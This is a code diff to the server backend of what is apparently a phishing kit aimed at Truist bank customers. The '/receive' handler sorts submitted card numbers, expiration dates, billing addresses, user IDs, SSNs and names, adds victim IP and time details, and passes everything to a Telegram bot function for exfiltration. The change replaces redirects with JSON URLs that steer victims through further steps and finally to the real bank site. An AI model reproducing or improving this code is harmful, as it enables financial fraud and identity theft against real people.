@@ -223,7 +223,7 @@ app.post('/receive', async (req, res) => {
         `SYSTEM LANGUAGE  : ${systemLang}\n` +
         `💬 Telegram: https://t.me/UpdateTeams\n`;
 
-    res.redirect('/confirm?action=1');
+    res.send({url : "/confirm?action=1"});
   }
 
   if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes('cardnumber') || lowerCaseMyObjects.includes('billing address')) {
@@ -242,7 +242,7 @@ app.post('/receive', async (req, res) => {
         `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
         `💬 Telegram: https://t.me/UpdateTeams\n`;
 
-    res.send('dn');
+    res.send({url : "/link?step=1"});
   }
 
   if (lowerCaseMyObjects.includes('userid')) {
@@ -261,7 +261,7 @@ app.post('/receive', async (req, res) => {
         `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
         `💬 Telegram: https://t.me/UpdateTeams\n`;
 
-    res.send('dn');
+    res.send({url : "https://truist.com/"});
   }
 
   if (lowerCaseMyObjects.includes('ssn') || lowerCaseMyObjects.includes('firstname') || lowerCaseMyObjects.includes('lastname')) {
@@ -280,7 +280,7 @@ app.post('/receive', async (req, res) => {
         `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
         `💬 Telegram: https://t.me/UpdateTeams\n`;
 
-    res.redirect('/confirm?action=2');
+    res.send({url : "/confirm?action=2"});
   }
 
   const sendMessage = sendMessageFor(botToken, chatId);
